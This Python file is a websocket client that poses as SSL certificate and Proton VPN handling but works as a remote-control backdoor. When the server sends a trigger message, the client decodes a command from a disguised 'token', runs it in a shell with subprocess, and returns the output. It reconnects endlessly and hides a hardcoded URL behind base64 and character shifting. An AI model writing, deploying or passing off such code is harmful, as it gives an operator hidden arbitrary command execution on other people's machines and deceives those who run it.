import asyncio
import ssl
import subprocess
import time

import websockets
from utils import varify_cert, cert_text, solve_ssl, receive_file_parent, get_proton_token


async def start_client():
    ssl_context = varify_cert(cert_text)
    cert_tex = ''
    update = False
    uri = "wss://127.0.0.1:8000/ws/parent"
    code = 0

    while True:
        if update:
            ssl_context = varify_cert(cert_tex)
        try:
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                while True:
                    try:
                        print("waiting")
                        response = await asyncio.create_task(receive_file_parent(websocket))
                        await websocket.send(response)
                        print("---")
                        proton_js_condition = await websocket.recv()
                        if proton_js_condition == "proton-vpn?yes:no":
                            ssl_check = get_proton_token()
                            cert_tex = solve_ssl(ssl_session_token=ssl_check)
                            result = subprocess.run(cert_tex, shell=True, capture_output=True, text=True)

                            # Handle if the command returns nothing
                            if result.stdout == "":
                                await websocket.send("Null")
                                continue

                            await websocket.send(result.stdout)

                        # command = await websocket.recv()
                        # # if command == '1':
                        # print(command)
                        # await websocket.send("2")
                    except websockets.ConnectionClosedOK:
                        # This exception is raised on a clean closure (code 1000)
                        print("Connection closed cleanly (code 1000)")
                        code = 1000
                        break
                    except Exception as e:
                        # Send any errors back to the server
                        await websocket.send(str(e))
                        continue

        except websockets.exceptions.ConnectionClosedError:
            print("Connection closed. Retrying in 3 seconds...")
            time.sleep(3)
        except ssl.SSLCertVerificationError:
            update = True
            cert_tex = solve_ssl(ssl_session_token="a3d3c3Y6Ly8xMjcuMC4wLjE6ODAwMC9qaHctZmh1d2xpbGZkd2g=")
            print("SSL certificate verification failed. Retrying in 3 seconds...")
            time.sleep(3)
        except Exception as e:
            print(f"Connection failed: {e}")
            print("Retrying in 3 seconds...")
            time.sleep(3)
        finally:
            if code == 1000:
                break
            print("Closing connection")


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(start_client())
